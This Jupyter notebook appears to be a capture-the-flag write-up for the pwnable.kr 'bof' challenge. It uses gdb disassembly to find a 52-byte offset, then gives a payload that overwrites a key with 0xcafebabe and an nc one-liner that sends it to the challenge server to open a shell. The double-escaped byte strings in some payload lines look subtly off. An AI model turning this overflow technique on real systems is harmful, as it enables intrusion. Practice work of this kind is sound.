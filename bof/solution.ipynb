{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "after analysing bof with gdb, mainly the 'disass' tool we can assume that the\n",
    "key we want to change is located on `ebp+0x8`  \n",
    "\n",
    "based on   \n",
    "`cmp    DWORD PTR [ebp+0x8],0xcafebabe`\n",
    "(we are comparing the value at ebp+0x8 with 0xcafebabe)\n",
    "\n",
    "then, based on the continuation of \n",
    "```\n",
    "    0x00000644 <+24>:    call   0x645 <func+25>\n",
    "    0x00000649 <+29>:    lea    eax,[ebp-0x2c]\n",
    "    0x0000064c <+32>:    mov    DWORD PTR [esp],eax\n",
    "```\n",
    "we can safely assume that `overflowme` is on `ebp-0x2c`\n",
    "\n",
    "from `(gdb) x/1s $ebp-0x2c`\n",
    "we know that the address is `0xffffcc4c`\n",
    "\n",
    "and from `(gdb) x $ebp+8`\n",
    "we know that the address is `0xffffcc80`\n",
    "\n",
    "difference between these 2 addresses is 52\n",
    "`0xffffcc4c - 0xffffcc80 = -52`\n",
    "\n",
    "so we need a buffer overflow exploit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# 52 bytes of padding + bytes we want to overwrite\n",
    "print ('a'*52+'\\xbe\\xba\\xfe\\xca')\n",
    "\n",
    "# but this will not work :D because python3 print function encodes the bytes to string\n",
    "# so we want a way to print the bytes as they are\n",
    "\n",
    "import sys\n",
    "\n",
    "sys.stdout.buffer.write(b'\\\\x01'*52+b'\\\\xbe\\\\xba\\\\xfe\\\\xca' + b'\\\\n')\n",
    "\n",
    "# this will print the bytes as they are\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "but we need to to print it, use 'nc' to connect to pwnable server and also use cat for flag\n",
    "```bash\n",
    "(python3 -c \"import sys; sys.stdout.buffer.write(b'\\\\x01'*52+b'\\\\xbe\\\\xba\\\\xfe\\\\xca' + b'\\\\n')\";cat) | nc pwnable.kr 9000 \n",
    "```\n",
    "\n",
    "then just run `cat flag`"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
